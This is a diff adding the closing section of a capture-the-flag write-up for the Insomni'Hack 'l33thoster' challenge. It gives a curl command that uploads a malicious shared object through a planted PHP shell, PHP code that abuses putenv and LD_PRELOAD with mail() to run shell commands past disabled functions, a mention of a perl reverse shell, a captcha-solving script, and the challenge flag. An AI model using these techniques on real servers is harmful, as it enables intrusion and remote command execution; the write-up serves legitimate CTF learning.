@@ -129,4 +129,56 @@ Let's request our file in the browser and enjoy RCE.
 ![screen6.png]({{ site.url }}/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen6.png)
 Trying various command execution functions results in nothing so we'd better check `phpinfo`
 ![screen8.png]({{ site.url }}/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen8.png)
-It seems that `mail()` and `putenv()` aren't filtered, so we could overwrite `LD_PRELOAD` to our custom `.so` file and overwrite some function that mail calls
+It seems that `mail()` and `putenv()` aren't filtered, so we could overwrite `LD_PRELOAD` to our custom `.so` file and overwrite some function that mail calls.
+I stumbeled across another problem of how to upload a valid `.so` file since we didn't have arbitrary upload , also `file_put_contents` and other file manipulation functions were filtered, the solution was to upload the file using our php script and `move_uploaded_file` function. 
+_ for more details about compiling and generating .so file please check https://corb3nik.github.io/blog/alictf-2016/homework_
+```sh
+curl -vvv 'http://35.246.234.136/images/cce36633671a3a556973a0b2d3592fe4371a5bde/test.xyz?0=move_uploaded_file($_FILES[%22image%22][%22tmp_name%22],%20%22/var/www/html/images/cce36633671a3a556973a0b2d3592fe4371a5bde/hack.so%22);' -F 'image=@hack.so' -g
+```
+Next we need to execute the following PHP code to get shell command execution.
+
+```php
+	echo putenv("LD_PRELOAD=/var/www/html/images/cce36633671a3a556973a0b2d3592fe4371a5bde/hack.so");
+  echo putenv("exec=".$_GET['cmd']);
+  echo mail("a", "a", "a");
+  show_source("/tmp/out.txt");
+```
+
+I have used a perl payload to get reverse shell, the final step was to bypass the captcha  in the `get_flag` binary in an automated way , I have used `PHP` for this.
+
+```php
+<?php
+
+
+        $descriptorspec = array(
+           0 => array("pipe", "r"),  
+           1 => array("pipe", "w"),  
+           2 => array("file", "/tmp/error-output.txt", "a")
+        );
+
+        $cwd = '/';
+        $env = array();
+
+        $process = proc_open('/get_flag', $descriptorspec, $pipes, $cwd, $env);
+
+        if (is_resource($process)) {
+
+            $res = eval('return '.explode(":", fread($pipes[1], 1024))[1].';');
+
+            fwrite($pipes[0], $res);
+             fclose($pipes[0]);
+
+            echo fread($pipes[1], 1024);
+
+            echo fread($pipes[1], 1024);
+
+            $return_value = proc_close($process);
+
+        }
+?>
+```
+```sh
+$ php -f /tmp/file.php
+
+INS{l33t_l33t_l33t_ich_hab_d1ch_li3b}
+```
